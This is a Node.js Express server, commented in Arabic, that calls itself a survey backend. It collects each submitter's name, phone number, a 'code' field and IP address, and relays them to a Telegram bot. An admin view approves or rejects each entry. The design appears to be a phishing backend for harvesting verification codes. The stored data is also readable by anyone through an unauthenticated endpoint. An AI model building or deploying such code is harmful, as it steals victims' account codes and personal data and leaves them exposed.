const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// قاعدة بيانات JSON
const DB_FILE = path.join(__dirname, 'data', 'surveys.json');

// التأكد من وجود المجلدات
async function initDatabase() {
    try {
        await fs.mkdir(path.join(__dirname, 'data'), { recursive: true });
        try {
            await fs.access(DB_FILE);
        } catch {
            await fs.writeFile(DB_FILE, JSON.stringify([]));
        }
    } catch (error) {
        console.error('Error initializing database:', error);
    }
}

// API Routes
app.get('/api/surveys', async (req, res) => {
    try {
        const data = await fs.readFile(DB_FILE, 'utf8');
        res.json(JSON.parse(data));
    } catch (error) {
        res.status(500).json({ error: 'Failed to read surveys' });
    }
});

app.post('/api/surveys', async (req, res) => {
    try {
        const newSurvey = {
            ...req.body,
            id: `FS-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
            date: new Date().toLocaleString('ar-SA'),
            status: 'pending',
            ip: req.ip
        };

        const data = await fs.readFile(DB_FILE, 'utf8');
        const surveys = JSON.parse(data);
        surveys.push(newSurvey);
        
        await fs.writeFile(DB_FILE, JSON.stringify(surveys, null, 2));
        
        // إرسال لتيليجرام
        await sendToTelegram(newSurvey);
        
        res.json({ success: true, id: newSurvey.id });
    } catch (error) {
        res.status(500).json({ error: 'Failed to save survey' });
    }
});

app.put('/api/surveys/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const { status } = req.body;
        
        const data = await fs.readFile(DB_FILE, 'utf8');
        let surveys = JSON.parse(data);
        
        const index = surveys.findIndex(s => s.id === id);
        if (index !== -1) {
            surveys[index].status = status;
            surveys[index].reviewed_at = new Date().toLocaleString('ar-SA');
            
            await fs.writeFile(DB_FILE, JSON.stringify(surveys, null, 2));
            res.json({ success: true });
        } else {
            res.status(404).json({ error: 'Survey not found' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Failed to update survey' });
    }
});

// إرسال لتيليجرام
async function sendToTelegram(survey) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!token || !chatId) return;
    
    const message = `
📊 استبيان جديد
👤 الاسم: ${survey.name}
📞 الهاتف: ${survey.phone}
🔐 الرمز: ${survey.code}
🆔 الرقم: ${survey.id}
    `;
    
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.error('Telegram error:', error);
    }
}

// إحصائيات
app.get('/api/stats', async (req, res) => {
    try {
        const data = await fs.readFile(DB_FILE, 'utf8');
        const surveys = JSON.parse(data);
        
        const stats = {
            total: surveys.length,
            pending: surveys.filter(s => s.status === 'pending').length,
            approved: surveys.filter(s => s.status === 'approved').length,
            rejected: surveys.filter(s => s.status === 'rejected').length
        };
        
        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: 'Failed to get stats' });
    }
});

// بدء السيرفر
initDatabase().then(() => {
    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`🌐 Frontend: http://localhost:${PORT}`);
        console.log(`👨‍💼 Admin: http://localhost:${PORT}/admin`);
    });
});